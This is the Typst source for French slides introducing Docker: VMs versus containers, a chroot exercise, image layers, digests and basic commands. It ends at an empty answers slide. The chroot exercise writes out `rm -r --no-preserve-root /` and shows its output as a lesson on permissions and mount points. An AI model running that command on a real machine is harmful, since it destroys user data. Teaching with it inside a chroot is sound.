// Cours « Docker : fondements de la technologie de conteneurisation » — Typst + Touying.
// Compilation (depuis la racine du dépôt) :
//   typst compile --root . --font-path commun/fonts docker/docker.typ build/docker.pdf
// Une diapo = un titre `==` ; une section (surtitre bleu) = un titre `=`.
// Structure : règles de .claude/skills/structurer-diapos-cours ; apparence : charte de commun/.

#import "../commun/theme-cours.typ": *

#show: cours-theme.with(
  auteur: [Jean-Mathieu Chantrein],
  titre-court: [Fondements de la technologie de conteneurisation Docker],
)

#couverture(illustration: "couches")[Docker][Fondements de la technologie de conteneurisation][Jean-Mathieu Chantrein][12 novembre 2026]
#speaker-note[Les quatre barres à droite évoquent les couches d’une image : trois en lecture seule (gris), une couche en lecture/écriture au sommet (bleu vif).]

= Sommaire

== Plan du cours

#plan-cours(
  ([Introduction générale], [Rappel VM, conteneurisation, chroot, familles de conteneurs]),
  ([Bases], [Images, conteneurs, persistance, sécurité, réseau]),
  ([Utilisation avancée], [Dockerfile, étude de cas sécurité, Compose, erreurs à éviter]),
  ([Ouverture et TP], [Podman ; travaux pratiques : Dockerfile, Compose, Swarm]),
)


= Introduction générale

== Rappel : la machine virtuelle
#let _note = [Rappel volontairement court : la virtualisation fait l’objet d’un cours séparé.]
#anime(
  rang(
    bloc[Machine virtuelle (VM)][
      - Un ordinateur complet (processeurs, mémoire, disques, réseau) virtualisé par un hyperviseur
      - Chaque VM embarque son propre système d'exploitation, avec son noyau
      - Sous Linux : *KVM* (module du noyau qui fait exécuter la VM par le processeur) et *QEMU* (le processus qui fournit la machine)
      - Autres hyperviseurs : Xen, Hyper-V, VMware ESXi, VirtualBox ; détails dans le cours _Virtualisation_
    ],
  ),
  rang(
    bloc[Avantages][
      - N'importe quel OS invité
      - Isolation forte : un noyau par VM
      - Snapshots, migration à chaud
    ],
    bloc(role: "precaution")[Inconvénients][
      - Un OS complet par VM : mémoire et disque
      - Démarrage plus lent qu'un conteneur
      - Performance inférieure au natif
    ],
  ),
  note: _note,
)

== La conteneurisation
#let _note = [Les mécanismes du noyau ne sont volontairement pas nommés ici : namespaces (isoler), cgroups (limiter), capabilities, seccomp et AppArmor (restreindre) sont nommés après l’exercice chroot, puis détaillés dans la partie Sécurité. Orchestration (Compose, Swarm, Kubernetes) : en fin de cours. Le terme « OS-level virtualization » est courant dans la littérature (Wikipedia, TechTarget, O’Reilly) : on le nomme pour pouvoir le discuter. Bibliothèques : sous Debian ou Ubuntu, la glibc est dans /lib/x86\_64-linux-gnu/libc.so.6 ; une image Alpine utilise musl, d’où des incompatibilités avec des binaires compilés pour glibc.]
#anime(
  rang(
    bloc[La conteneurisation][
      - Un conteneur fournit un environnement d'exécution isolé pour une ou plusieurs applications
      - Il partage le noyau du système d'exploitation de l'hôte
      - Le noyau de l'hôte *isole* ses processus, *limite* leurs ressources et *restreint* leurs droits
      - Outils : Docker, Podman, LXC, Apptainer…
    ],
    bloc[Ce qu'embarque un conteneur : l'espace utilisateur][
      - *Bibliothèques* : le code partagé (`.so`) chargé à l'exécution — libc (glibc, ou musl sous Alpine), libssl, libz
      - Selon le conteneur : shell, gestionnaire de paquets, configuration (`/etc`)
      - *Pas de noyau* : c'est celui de l'hôte
      - `ldd /bin/bash` liste les bibliothèques partagées de bash (exercice chroot)
    ],
  ),
  note: _note,
)

== Conteneurs : bilan
#let _note = none
#anime(
  rang(
    bloc(role: "pratique")[Avantages][
      - Portabilité des conteneurs (+ ou −)
      - Isolation des applications (+ ou −)
      - Mutualisation des ressources, à la demande
      - Démarrage quasiment aussi rapide qu'une application native
      - Pas d'OS invité, contrairement aux VM : surcoût très faible
    ],
    bloc(role: "precaution")[Inconvénients][
      - Applications compatibles avec le noyau hôte uniquement
      - Données volatiles par défaut : à conserver hors du conteneur
    ],
  ),
  note: _note,
)

== Architectures comparées
#let _note = [Représentation fidèle (cas KVM). Une VM est un processus QEMU de l’hôte qui contient un OS invité complet, noyau compris : son code s’exécute directement sur le processeur (mode VT-x / AMD-V), le module kvm du noyau n’intervient que sur les opérations privilégiées, QEMU émule les périphériques. Un conteneur est un ensemble de processus ordinaires de l’hôte : ils appellent directement le noyau de l’hôte, qui les isole (namespaces), les limite (cgroups) et restreint leurs droits (capabilities, seccomp, AppArmor : le module de sécurité actif par défaut sur Debian et Ubuntu). Le moteur (dockerd, containerd, runc) et libvirt sont à côté : ils créent et gèrent, ils ne sont pas traversés. Un hyperviseur de type 1 comme ESXi ou Xen se place, lui, directement sur le matériel (cours Virtualisation).]
#anime(
  grid(columns: (1fr, 1fr), column-gutter: px(48),
    pile-archi([Machines virtuelles (KVM)], [Espace utilisateur de l'hôte],
      [*Gestion* (crée, démarre, arrête) : libvirt],
      (vm[VM 1 : QEMU], vm[VM 2 : QEMU], vm[VM 3 : QEMU]),
      [Noyau Linux de l'hôte], ([module kvm],), [Matériel (VT-x / AMD-V)]),
    pile-archi([Conteneurs], [Espace utilisateur de l'hôte],
      [*Gestion* (crée, démarre, arrête) : le moteur Docker],
      (vm(couleur: c.bleu, haut: [Appli /\ bibliothèques], bas: [], fond-bas: c.appli, taille: px(24))[Conteneur 1],
       vm(couleur: c.bleu, haut: [Appli /\ bibliothèques], bas: [], fond-bas: c.appli, taille: px(24))[Conteneur 2],
       vm(couleur: c.bleu, haut: [Appli /\ bibliothèques], bas: [], fond-bas: c.appli, taille: px(24))[Conteneur 3]),
      [Noyau Linux de l'hôte], ([isole], [limite], [restreint]), [Matériel]),
  ),
  note: _note,
)

== Chroot : les prémices de la conteneurisation
#let _note = [Laisser chercher : la première tentative (chroot new\_root /bin/bash) échoue, faute de bibliothèques dans new\_root. La solution est sur la diapositive suivante. Pourquoi pas mount : un mount --bind de /dev ou /proc dans new\_root, oublié, puis un rm -rf new\_root efface les fichiers de l’hôte à travers le montage (rm traverse les points de montage).]
#anime(
  rang(
    bloc(role: "question")[À vous][
      Réalisez un chroot pour un utilisateur d'uid 2000 sur un répertoire nommé `new_root`.
  
      Vous aurez besoin de : `chroot`, `cp`, `ldd`, `mkdir`, `man`.
    ],
    bloc(role: "danger")[Attention][
      Limitez-vous à ces commandes : un `mount`, par exemple, peut casser la configuration de votre machine.
    ],
  ),
  note: _note,
)

== Chroot : une solution
#let _note = [Sur Ubuntu 24.04 (/usr fusionné) : cp --parents recrée l’arborescence des bibliothèques sous new\_root.]
#anime(
  terminal[
  ```
  $ mkdir -p new_root/bin && cp /bin/bash new_root/bin/
  $ sudo chroot new_root /bin/bash
  chroot: failed to run command '/bin/bash': No such file or directory
  $ ldd /bin/bash   # liste les bibliothèques partagées de /bin/bash
          linux-vdso.so.1 (0x00007f3acd2cf000)
          libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f3acd148000)
          libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3accf54000)
          /lib64/ld-linux-x86-64.so.2 (0x00007f3acd2d1000)
  $ cp --parents $(ldd /bin/bash | grep -o '/[^ ]*') new_root/
  $ sudo chroot --userspec 2000:2000 new_root /bin/bash
  bash-5.2$ echo $UID
  2000
  ```
  ],
  source-de: [#link("https://man7.org/linux/man-pages/man1/chroot.1.html")[man chroot(1)]],
  note: _note,
)

== Décomposer la commande
#let _note = [Sorties réelles (Ubuntu 24.04, adresses abrégées). linux-vdso.so.1 n’a pas de chemin : c’est une bibliothèque fournie par le noyau en mémoire, d’où le grep qui ne retient que ce qui commence par /. Exécution de droite à gauche : ldd, puis grep, puis la substitution \$(), enfin cp.]
#anime(
  terminal(titre: none)[
  ```
  cp --parents $( ldd /bin/bash | grep -o '/[^ ]*' ) new_root/
  ```
  ],
  lignes(largeur: px(64),
    ([1], [`ldd /bin/bash` : les bibliothèques partagées de bash]),
    ([2], [`grep -o '/[^ ]*'` : ne garde que les chemins (de `/` jusqu'à l'espace)]),
    ([3], [`$( … )` : remplace la commande par son résultat]),
    ([4], [`cp --parents` : copie en recréant l'arborescence sous `new_root`]),
  ),
  note: _note,
)

== Chroot : à votre avis ?
#let _note = [Questions du cours d’origine. Laisser chercher : les réponses sont sur la diapositive suivante.]
#anime(
  rang(
    bloc(role: "question")[À vous][
      Copiez aussi `ls` et `rm` dans `new_root` (même méthode que pour bash), puis entrez avec `--userspec 2000:2000`.
  
      - `ls -l /` : à qui appartiennent les fichiers ? Pourquoi ?
      - `rm -r --no-preserve-root /` : que se passe-t-il ?
      - Et si l'on entre *sans* `--userspec` ?
    ],
  ),
  note: _note,
)

== Chroot : réponses
#let _note = [Sur debian:13, bash 5.2 : copie faite par l’uid 1000, chroot --userspec 2000:2000 puis chroot en root. Le point 3 rejoint l’encart « mount » de l’énoncé : un mount --bind oublié dans new\_root, et rm efface l’hôte à travers.]
#anime(
  terminal(taille: px(18))[
  ```
  $ sudo chroot --userspec 2000:2000 new_root /bin/bash
  bash-5.2$ ls -l /
  drwxrwxr-x 2 1000 1000 4096 bin
  bash-5.2$ rm -r --no-preserve-root /
  rm: cannot remove '/lib/.../libc.so.6': Permission denied
  $ sudo chroot new_root /bin/bash            # en root, sans --userspec
  bash-5.2# rm -r --no-preserve-root /
  rm: cannot remove '/': Device or resource busy
  bash-5.2# ls
  bash: ls: command not found
  ```
  ],
  lignes(largeur: px(64),
    ([1], [Fichiers à l'uid *1000* (vous, qui les avez copiés) ; des numéros, pas des noms : pas de `/etc/passwd` dans `new_root`]),
    ([2], [L'uid 2000 n'a aucun droit d'écriture : _Permission denied_ partout]),
    ([3], [Root efface tout `new_root` ; seul « / » résiste (point de montage). L'hôte n'est pas touché… sauf si un de ses dossiers y est monté]),
  ),
  note: _note,
)

== Du chroot aux outils de conteneurisation
#let _note = [Conclusion de l’exercice : c’est pénible, et ce n’est pas fait dans les règles de l’art. Lecture de gauche à droite : notre chroot n’utilise qu’une primitive du noyau ; on est donc tout en bas ; les outils de conteneurisation automatisent et combinent toutes ces primitives. Analogie : chroot seul est une instruction ; l’ensemble des primitives du noyau joue le rôle de l’assembleur ; Docker, Podman, LXC celui d’un langage de haut niveau. Ce qui compte, c’est la complexité et son abstraction : abstraite ne veut pas dire supprimée ; il reste à concevoir l’image, le réseau, la sécurité, comme il reste à concevoir le programme en C++ ou en Python. Docker ne fait pas de magie : il automatise ces mêmes mécanismes. Détail : runc n’utilise pas chroot mais pivot\_root, qui change réellement la racine du montage et ferme l’échappement classique de chroot par root. Transition : la diapositive suivante présente les familles d’outils (Docker, Podman, LXC…).]
#anime(
  rang(
    bloc(role: "precaution")[Notre exercice chroot, fait à la main][
      - *Incomplet* : seul le système de fichiers est isolé ; processus, réseau et ressources restent partagés
      - *Fragile* : root peut sortir d'un chroot
      - *Artisanal* : ni versionné, ni partageable, ni reproductible
      - *Pénible* : chaque binaire et chaque bibliothèque à copier
    ],
    bloc(role: "retenir")[Du bas niveau au haut niveau][
      - *Primitives du noyau* : chroot · namespaces (isoler) · cgroups (limiter) · capabilities, seccomp (restreindre)
      - *Haut niveau* : Docker, Podman, LXC les automatisent et les combinent
      - Analogie : chroot seul = une instruction ; les primitives = l'assembleur ; Docker = un langage de haut niveau
    ],
  ),
  note: _note,
)

== Trois familles de conteneurs
#let _note = [Podman : sans démon et utilisable sans root (rootless), notions vues dans la partie Sécurité. Migration à chaud des conteneurs : le checkpoint/restore (CRIU) existe, mais reste expérimental et peu utilisé en pratique. Imbrication : un conteneur LXC peut héberger Docker, si l’imbrication est autorisée (Proxmox : option « nesting » du conteneur ; Incus/LXD : security.nesting\=true).]
#anime(
  rang(
    bloc[Applicatifs][
      - Un conteneur = un (micro)service
      - Sans état, données volatiles, très prisés en DevOps
      - *Docker*, *Podman* (compatible avec Docker)
    ],
    bloc[Administration système][
      - Remplacent les VM : avec état, persistance, snapshot, sauvegarde, migration
      - *LXC* (LXD, son fork Incus, Proxmox `pct`), OpenVZ
    ],
    bloc[Calcul haute performance][
      - Environnements isolés et performants sur clusters de calcul
      - *Apptainer* (ex-Singularity) : InfiniBand et OpenMPI natifs, exécute des images Docker
    ],
  ),
  note: _note,
)

== DevOps et la famille des « Ops »
#let _note = [Ops \= operations, l’exploitation : tout ce qui fait tourner la production (administration système, réseau, bases de données, supervision, astreinte). L’administrateur système en est le cœur historique, d’où SysOps (popularisé par la certification AWS SysOps Administrator). Esprit critique : beaucoup de ces suffixes relèvent du marketing. Pour ce cours, trois comptent vraiment : DevOps, DevSecOps (la partie sécurité du cours) et GitOps (avec Kubernetes). Repères : GitOps, terme de Weaveworks (2017) ; FinOps, fondation de la Linux Foundation ; AIOps, terme de Gartner.]
#anime(
  note(role: "retenir")[*Ops* (_operations_, l'exploitation) : faire tourner la production — administration système, réseau, bases de données, supervision, astreinte.],
  rang(
    bloc[Les trois qui comptent ici][
      - *SysOps* : exploitation système classique, sans le rapprochement avec le développement
      - *DevOps* : développement + exploitation ; livrer souvent, automatiser (CI/CD), infrastructure décrite par du code
      - *DevSecOps* : DevOps + sécurité intégrée dès le début (images, dépendances, secrets)
    ],
    bloc(role: "precaution")[Beaucoup d'autres, souvent marketing][
      - *GitOps* : l'état voulu décrit dans Git, appliqué par un agent (Argo CD, Flux)
      - *NetDevOps*, *MLOps*, *DataOps*, *FinOps*… : les méthodes DevOps appliquées à un domaine
    ],
  ),
  note: _note,
)

= Bases

== Docker : historique
#let _note = none
#anime(
  lignes(largeur: px(220), taille: px(28),
    ([2013], [Projet lancé chez DotCloud par Solomon Hykes, open source en mars 2013]),
    ([Mars 2014], [Version 0.9 : abandon de LXC au profit de libcontainer (devenue `runc`), développée par Docker]),
    ([Aujourd'hui], [Docker Engine 29.x en amont (novembre 2026) ; Debian 13 fournit la 26.1]),
  ),
  note(role: "precaution")[Version du cours : *docker.io 26.1.5* de Debian 13. Sur un forum, dans une documentation ou une réponse d'IA, vérifier la date et la version de Docker concernée.],
  note: _note,
)

== Standards et architecture actuelle
#let _note = [Une même image OCI fonctionne avec Docker, Podman ou containerd. Kubernetes 1.24 (2022) a retiré dockershim, la couche d’adaptation vers Docker. Les registres (Docker Hub, GHCR) sont présentés après « Tag ou digest », une fois les notions d’image et de tag acquises. Source : cours en ligne de l’auteur (jmchantrein.github.io/site/cours).]
#anime(
  lignes(largeur: px(260), taille: px(28),
    ([2015], [L'*OCI* (Open Container Initiative) standardise le format des images et le _runtime_, le programme qui lance un conteneur (`runc`)]),
    ([2017], [`containerd`, le service qui gère le cycle de vie des conteneurs, est confié à la CNCF (Cloud Native Computing Foundation)]),
    ([Aujourd'hui], [Docker Engine s'appuie sur `containerd` (cycle de vie) et `runc` (exécution)]),
    ([Kubernetes 1.24], [Kubernetes dialogue directement avec `containerd`, sans passer par Docker]),
  ),
  note: _note,
)

== Contexte d’utilisation et installation
#let _note = [Docker fonctionne aussi nativement sur Windows Server, pour conteneuriser des applications Windows. Play with Docker : service arrêté le 1er mars 2026 (annonce sur forums.docker.com) ; Docker oriente vers Docker Desktop ou iximiuz Labs. Paquets Debian 13 (apt-get install -s) : docker.io 26.1.5 recommande docker-cli, qui recommande docker-buildx 0.13.1 ; docker-compose 2.26.1 (plugin « docker compose ») est à demander. Le dépôt officiel de Docker (docker-ce, version 29 en novembre 2026) est l’alternative : ne pas mélanger les deux, la documentation Docker demande de retirer docker.io avant (docs.docker.com/engine/install/debian).]
#anime(
  rang(
    bloc[Où utiliser Docker ?][
      - Dans ce cours : *noyau Linux uniquement*
      - Natif sur GNU/Linux, ou dans une VM GNU/Linux
      - Windows et macOS : Docker Desktop (VM Linux intégrée)
      - En ligne : Play with Docker a fermé (1^er mars 2026) ; alternative : iximiuz Labs
    ],
    bloc(role: "pratique")[Installation sur Debian 13 (stable)][
      #terminal[
  ```
  # paquets de Debian 13 : docker.io 26.1.5
  $ sudo apt install docker.io docker-compose
  $ sudo usermod -aG docker $USER
  # puis déconnexion, reconnexion
  ```
      ]
      `docker-cli` et `docker-buildx` suivent (paquets recommandés).
    ],
  ),
  note(role: "danger")[Appartenir au groupe `docker` équivaut à être *root* sur la machine.],
  note: _note,
)

== Rappel : hachage et SHA-256
#let _note = [Rappel placé avant « Images et couches » : la définition d’une couche s’appuie sur son empreinte. Sorties réelles (sha256sum, coreutils de Debian 13). Vocabulaire : hash, empreinte, condensat et digest désignent le résultat ; « fonction de hachage » désigne le calcul. SHA-256 appartient à la famille SHA-2 (NIST, FIPS 180-4). printf plutôt que echo : echo ajoute un saut de ligne, qui changerait l’empreinte. Le « - » final indique que les données viennent de l’entrée standard.]
#anime(
  rang(
    bloc(role: "pratique")[Calcul][
      #terminal(taille: px(16))[
  ```
  $ printf 'Bonjour' | sha256sum
  9172e8eec99f144f72eca9a568759580edadb2cfd154857f07e657569493bc44  -
  $ printf 'bonjour' | sha256sum
  2cb4b1431b84ec15d35ed83bb927e27e8967d75f4bcd9cc4b25c8d879ae23e18  -
  $ head -c 100M /dev/zero | sha256sum
  20492a4d0d84f8beb1767f6616229f85d44c2827b64bdbfb260ee12fa1109e0e  -
  ```
      ]
    ],
    bloc(role: "retenir")[Propriétés][
      - *n octets quelconques* (un mot, un fichier, une archive) → une empreinte de 256 bits = 64 caractères hexadécimaux
      - Même entrée, même empreinte ; taille fixe quelle que soit l'entrée
      - Une seule lettre change : empreinte méconnaissable
      - Impossible en pratique de retrouver les données, ou d'en fabriquer d'autres de même empreinte
    ],
  ),
  note: _note,
)

== Images et couches
#let _note = none
#anime(
  rang(
    bloc[Définitions formelles : les images et les couches][
      - Une *image* est un empilement ordonné de modifications d'un système de fichiers racine
      - Chaque modification est conservée dans une *couche* (_layer_), identifiée par l'empreinte SHA-256 de son contenu
      - Les couches naissent des étapes de construction de l'image (détaillées plus loin)
      - Les couches d'une image sont en *lecture seule* et *partagées* entre images
      - Une image est *immuable* et *sans état* : on ne l'exécute pas, on l'*instancie*
    ],
  ),
  note: _note,
)

== Un conteneur : l’instanciation d’une image
#let _note = [Structure du cours d’origine (« Représentation graphique ») dans le vocabulaire graphique du deck : couches en lecture seule bleu clair, couche du conteneur orange en pointillés (comme sur « De l’instruction à la couche »). Flèches « diff » : chaque couche ne contient que les différences avec celle du dessous. Clic 1 : le conteneur ; clics 2 et 3 : suppression et commit.]
#anime(
  grid(columns: (0.9fr, 1.1fr), column-gutter: px(40), align: horizon,
    stack(spacing: px(8),
      couche([Couche RW du conteneur — lecture/écriture], fond: roles.avertissement.entete, hauteur: px(68), taille: px(24)),
      couche([Couche n : z3d56…], hauteur: px(58), taille: px(26)),
      couche([⋮], fond: c.ardoise, hauteur: px(36), taille: px(24)),
      couche([Couche 1 : a8ze4…   (image, lecture seule)], hauteur: px(58), taille: px(24)),
    ),
    rendre-bloc(bloc(role: "retenir")[À retenir][
      - Le système de fichiers racine du conteneur est celui de l'image, en *lecture seule*
      - Les modifications vont dans une nouvelle couche en lecture/écriture : *copy on write*
      - Supprimer le conteneur supprime cette couche
      - `docker container commit` fige cette couche dans une nouvelle image (plus loin)
    ]),
  ),
  note: _note,
)

== Image ≠ couche ≠ conteneur
#let _note = none
#anime(
  rang(
    bloc[Couche][
      - Contient uniquement les différences d'un système de fichiers
      - Ignore les images qui l'utilisent
      - Partageable entre images
    ],
    bloc[Image][
      - Référence une ou plusieurs couches
      - Forme un système de fichiers racine
      - Peut être instanciée
    ],
    bloc[Conteneur][
      - Résultat de l'instanciation d'une image
      - Sa racine est construite depuis l'image
      - Ajoute une couche en lecture/écriture
    ],
  ),
  note: _note,
)

== Représentation graphique : docker container commit
#let _note = [Repris du cours d’origine. Clic 1 : docker container commit, la couche RW devient la couche n+1 (d32…) de l’image y, qui réutilise les n couches de x. Le point « chaque couche construite localement a une image intermédiaire (docker image ls --all) » ne vaut plus avec BuildKit : voir « Construction pas à pas ».]
#anime(
  grid(columns: (0.95fr, 1.05fr), column-gutter: px(40), align: horizon,
    stack(spacing: px(8),
      grid(columns: (1fr, 1fr), column-gutter: px(10),
        couche([image y : couche n+1\ d32…], fond: roles.pratique.entete, hauteur: px(66), taille: px(22)),
        couche([conteneur x :\ couche RW], fond: roles.avertissement.entete, hauteur: px(66), taille: px(22)),
      ),
      couche([Couche n : z3d56…], hauteur: px(54), taille: px(24)),
      couche([⋮], fond: c.ardoise, hauteur: px(34), taille: px(22)),
      couche([Couche 1 : a8ze4…  (lecture seule)], hauteur: px(54), taille: px(24)),
    ),
    rendre-bloc(bloc(role: "retenir")[À retenir][
      - `docker container commit x y` : on crée une image `y` à partir du conteneur `x` (l'équivalent d'un _snapshot_ à froid)
      - `x` et `y` ont leurs n couches *en commun* (mutualisation des ressources)
      - Supprimer une image ne supprime que ses couches non partagées : supprimer `x` n'empêche pas d'utiliser `y`
    ]),
  ),
  note: _note,
)

== Représentation graphique : le partage des couches
#let _note = [Remplace l’« arbre des images » du cours d’origine : avec BuildKit (docker image build par défaut), une image n’a pas de parent (champ Parent vide) ; seuls docker container commit et l’ancien builder en renseignent un. Le partage, lui, se fait couche par couche. Sur docker.io 26.1.5 de Debian 13 : après docker container commit depuis debian:13, docker system df -v affiche pour y SHARED SIZE 120.2MB et UNIQUE SIZE 0B. Les images pendantes se listent avec docker image ls --filter dangling\=true et se suppriment avec docker image prune.]
#anime(
  grid(columns: (0.95fr, 1.05fr), column-gutter: px(40), align: horizon,
    stack(spacing: px(8),
      grid(columns: (1fr, 1fr), column-gutter: px(10),
        couche([image x], fond: c.nuit, hauteur: px(56), taille: px(24)),
        couche([image y\ couche n+1 : d32…], fond: roles.pratique.entete, hauteur: px(56), taille: px(22)),
      ),
      couche([Couche n : z3d56…  (partagée)], hauteur: px(54), taille: px(24)),
      couche([⋮], fond: c.ardoise, hauteur: px(34), taille: px(22)),
      couche([Couche 1 : a8ze4…  (partagée)], hauteur: px(54), taille: px(24)),
    ),
    rendre-bloc(bloc(role: "retenir")[À retenir][
      - `y` réutilise les n couches de `x` : elles sont stockées *une seule fois* sur le disque
      - `docker system df -v` le montre : colonnes _SHARED SIZE_ et _UNIQUE SIZE_
      - Deux images partagent toujours un bloc continu depuis le bas de la pile (même image de base, mêmes premières couches)
    ]),
  ),
  note: _note,
)

== Commandes de base : les images
#let _note = none
#anime(
  lignes(largeur: px(460), taille-cle: px(26), taille: px(26),
    ([`docker image pull`], [Télécharger une image (Docker Hub par défaut)]),
    ([`docker image push`], [Envoyer une image vers un registre]),
    ([`docker search`], [Chercher une image sur un registre]),
    ([`docker image ls`], [Lister les images présentes localement]),
    ([`docker image history`], [Afficher l'historique de création d'une image]),
    ([`docker image rm`], [Supprimer une image]),
    ([`docker container commit`], [Construire une image à partir d'un conteneur]),
    ([`docker image build`], [Construire une image à partir d'un Dockerfile]),
  ),
  note: _note,
)

== Commandes de base : les conteneurs
#let _note = none
#anime(
  lignes(largeur: px(480), taille-cle: px(26), taille: px(26),
    ([`docker container run`], [Démarrer un conteneur]),
    ([`docker container start / stop / restart`], [Démarrer, arrêter, redémarrer]),
    ([`docker container pause / unpause`], [Suspendre, reprendre]),
    ([`docker container logs`], [Obtenir les journaux d'un conteneur]),
    ([`docker container kill / rm`], [Tuer, supprimer un conteneur]),
    ([`docker container ls`], [Lister les conteneurs actifs (`-a` : tous)]),
    ([`docker container inspect`], [Informations bas niveau sur un conteneur]),
    ([`docker info / version`], [État de l'installation, version]),
  ),
  note: _note,
)

== Plusieurs commandes pour un même résultat
#let _note = none
#anime(
  rang(
    bloc[Commandes regroupées par objet][
      - Les commandes historiques (`docker ps`, `docker run`…) existent toujours
      - Docker les regroupe aussi par objet : `container`, `image`, `network`, `volume`, `system`, `builder`…
      - Les deux formes sont *équivalentes*
      - `docker <objet> --help` décrit les sous-commandes d'un objet
    ],
    bloc(role: "pratique")[Exemple][
      #terminal(taille: px(18))[
  ```
  $ docker ps -aq
  a6ae41d6d9bc
  $ docker container ls -aq    # même résultat
  a6ae41d6d9bc
  $ docker container --help
  Usage:  docker container COMMAND
  Manage containers
  ```
      ]
    ],
  ),
  note: _note,
)

== « Philosophie » de Docker
#let _note = [Principes seulement : les mécanismes viennent plus loin. Pas de root : quand root est inévitable, démarrer en root puis abandonner les droits dans l’entrypoint (gosu, setpriv ; su-exec sous Alpine), sans setuid (voir l’étude de cas sshd et « Root au démarrage seulement »). sshd : règle 5.7 du CIS Docker Benchmark, docker exec depuis l’hôte. Couches partagées : c’est aussi ce qui rend le cache de docker image build efficace (partie Dockerfile). Éphémère : volumes et bind mounts (partie Persistance). Plusieurs processus : un superviseur comme supervisor.]
#anime(
  rang(
    bloc[Bonnes pratiques recommandées][
      - *Éphémère* : un conteneur se jette et se recrée ; les données vivent ailleurs
      - *Un service par conteneur* (un seul processus pour les puristes)
      - *Pas de root* : les services système (sshd, crond, pare-feu) relèvent de l'hôte
      - *Images minimales* : rien de superflu, peu de couches
      - *Couches partagées* : ce qui change peu en bas de la pile
    ],
    bloc(role: "precaution")[« Philosophie » de Docker ?][
      - Adapter ces règles à ses besoins : plusieurs processus par conteneur si nécessaire
      - Utilisez-vous la bonne technologie de conteneurisation ?
    ],
  ),
  note: _note,
)

== Digest : nommer un objet par son contenu
#let _note = [Format OCI d’un digest : « algorithme:encodage », ici sha256 suivi de 64 caractères hexadécimaux. Exemple pratique (tag ou digest) après « Hello world ! : quatre empreintes », une fois le premier conteneur lancé. Les diapositives suivantes montrent qu’une image a plusieurs digests (index, manifeste, configuration, couches).]
#anime(
  rang(
    bloc[Un nom qui est l'empreinte du contenu][
      - Un objet (une couche, ou tout autre objet d'une image) → SHA-256 de son contenu exact → son *digest* : `sha256:9c6e3814…`
      - *Intégrité* : au téléchargement, Docker recalcule l'empreinte de ce qu'il reçoit et la compare au digest attendu
      - *Partage* : même contenu, même digest, stocké une seule fois
      - *Immuabilité* : changer le contenu change le digest, donc le nom
    ],
  ),
  note(role: "precaution")[Affichage abrégé : les 12 premiers caractères ; un début non ambigu suffit.],
  note: _note,
)

== Notre premier conteneur
#let _note = [Sortie réelle, docker.io 26.1.5 de Debian 13 (pilote overlay2).]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.2)[Terminal][
      #terminal(taille: px(16))[
  ```
  $ docker container run hello-world
  Unable to find image 'hello-world:latest' locally
  latest: Pulling from library/hello-world
  4f55086f7dd0: Pull complete
  Digest: sha256:1e4c05b897a7…
  Status: Downloaded newer image for hello-world:latest
  Hello from Docker!
  This message shows that your installation appears
  to be working correctly.
  ```
      ]
    ],
    bloc(role: "retenir")[Ce qui s'est passé][
      + Le client Docker contacte le démon Docker
      + Le démon télécharge l'image depuis Docker Hub
      + Le démon crée un conteneur à partir de cette image
      + La sortie du conteneur remonte au client, puis au terminal
    ],
  ),
  note: _note,
)

== Choisir ce qu’affiche une commande : --format
#let _note = [Les accolades déroutent la première fois : c’est la syntaxe des modèles (templates) du langage Go, dans lequel Docker est écrit. Le moteur remplit chaque {{.Champ}} avec la valeur correspondante, pour chaque objet (une ligne par conteneur avec docker container ls, l’objet entier avec inspect). Les noms de champs dépendent de la commande : docker container ls (.ID,.Names,.Image,.Status…), docker image ls (.Repository,.Tag,.Size…), docker container inspect (la structure JSON complète :.State.Status,.Config.Cmd,.RootFS.Layers…). Pour les découvrir : --format '{{json.}}' ou docker container inspect sans -f. Utilisé ensuite dans le cours : -f '{{.RootFS.Layers}}' (diapo suivante), --format '{{.Repository}}:{{.Tag}} {{.Digest}}', table {{.CreatedBy}}\\t{{.Size}}, docker container stats --format. Le piège -f / --filter d’après l’aide de docker.io 26.1.5. Sorties réelles (docker.io 26.1.5 de Debian 13), le 18 novembre 2026 ; le nom du conteneur est tiré au hasard à chaque docker container run. Référence : documentation Docker « Format command and log output ».]
#anime(
  rang(
    bloc[Lire un modèle][
      - `--format` reçoit un modèle (Go) : du texte, avec des trous entre `{{ }}`
      - `{{.Status}}` : le champ `Status` de l'objet courant
      - `{{.State.ExitCode}}` : un champ dans un champ
      - `table` : en-têtes et colonnes alignées (séparées par `\t`)
      - `{{json .}}` : tous les champs, pour savoir quoi demander
      - Entre apostrophes : le shell n'y touche pas
    ],
    bloc(role: "pratique")[Sur le conteneur hello-world][
      #terminal(taille: px(15))[
  ```
  $ docker container ls -a \
    --format '{{.Names}} : {{.Status}}'
  great_golick : Exited (0) 5 seconds ago
  $ docker container ls -a \
    --format 'table {{.Names}}\t{{.Status}}'
  NAMES          STATUS
  great_golick   Exited (0) 5 seconds ago
  ```
      ]
    ],
  ),
  note: _note,
)

== Hello world ! : quatre empreintes
#let _note = [Tout est sur cette diapositive : les deux lignes utiles du pull sont rappelées en haut du terminal, inutile de revenir en arrière. Chaque empreinte garde sa couleur sur la diapositive de réponses. À l’oral : faire remarquer que les quatre valeurs sont différentes alors qu’il n’y a qu’une image et qu’une couche, puis laisser chercher. Question du cours d’origine : « À quoi correspond 78445dd45222 lors du pull ? ». Sorties réelles (docker.io 26.1.5 de Debian 13), le 17 novembre 2026. Le « Digest » de hello-world change quand Docker Hub republie l’image (cf1b20a0c89a le 12 novembre, 1e4c05b897a7 le 17) : si la valeur affichée en séance diffère, c’est normal, et c’est une bonne illustration de la diapositive « Tag ou digest ».]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.25)[Terminal][
      #terminal(taille: px(15))[
  ```
  $ docker container run hello-world
  4f55086f7dd0: Pull complete
  Digest: sha256:1e4c05b897a7…
  $ docker image ls hello-world
  REPOSITORY    TAG      IMAGE ID       SIZE
  hello-world   latest   e2ac70e7319a   10.1kB
  $ docker image inspect -f '{{.RootFS.Layers}}' hello-world
  [sha256:897b3f2a7c1b…]
  ```
      ]
    ],
    bloc(role: "question")[À vous][
      Une seule image, une seule couche, et pourtant *quatre empreintes* différentes. Que désigne chacune ?
      - `4f55086f7dd0` : affichée pendant le pull
      - `1e4c05b897a7` : le « Digest » en fin de pull
      - `e2ac70e7319a` : l'IMAGE ID
      - `897b3f2a7c1b` : la couche vue par `inspect`
    ],
  ),
  note: _note,
)

== Quatre empreintes : réponses
